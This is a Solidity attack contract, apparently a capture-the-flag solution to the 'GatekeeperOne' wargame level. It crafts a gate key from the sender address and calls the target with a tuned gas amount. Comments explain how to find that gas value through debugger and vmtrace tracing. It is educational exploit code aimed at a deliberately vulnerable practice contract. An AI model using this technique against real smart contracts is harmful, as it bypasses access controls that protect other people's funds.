// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneSol {
    // 1. send a fail tx to contract
    // 2. find out the gasleft() through
    //   - use debug of remix, and find `mod` opcode with stack[0] or
    //   - use etherscan vmtrace page
    //     1. find `GAS` opcode,
    //     2. gasleft() value will be in next row of `GAS` opcode
    // 3. calculate the gas cost before gasleft() and _gas
    function attack(GatekeeperOne _one, uint256 _gas) external {
        // after testing, it will cost 254 before gasleft(), use to calculate _gas, for example:
        // `uint256 _gas = 8191 * 20 + 254; `

        // _gas could be: 999556 in my test
        bytes8 _gateKey = bytes8(uint64(uint16(msg.sender))) | bytes8(0x0000000100000000);
        _one.enter{gas: _gas}(_gateKey);
    }
}
